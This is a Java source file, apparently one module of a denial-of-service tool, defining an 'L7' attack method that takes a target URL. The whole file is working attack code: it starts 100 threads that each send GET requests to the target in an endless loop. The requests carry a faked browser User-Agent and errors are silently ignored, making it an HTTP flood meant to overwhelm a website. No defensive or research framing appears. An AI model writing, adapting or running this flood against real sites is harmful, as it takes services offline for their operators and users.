package ru.quizie.servicesleep.servicesleep.impls;

import ru.quizie.servicesleep.servicesleep.ServiceSleepMethod;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Layer7Method implements ServiceSleepMethod {

    @Override
    public String name() {
        return "L7";
    }

    @Override
    public String nameArg() {
        return "URL";
    }

    @Override
    public void actions(String parm1) {
        final ExecutorService executor = Executors.newFixedThreadPool(100);
        final Runnable task = () -> {
            try {
                while (true) {
                    final HttpURLConnection conn = (HttpURLConnection) new URL(parm1).openConnection();

                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    conn.setConnectTimeout(1000);
                    conn.setReadTimeout(1000);
                    conn.setRequestProperty("Connection", "keep-alive");
                    System.out.println(conn.getResponseCode());
                    conn.disconnect();
                }
            } catch (Exception ignored) {
            }
        };

        for (int i = 0; i < 100; i++) {
            executor.execute(task);
        }
    }
}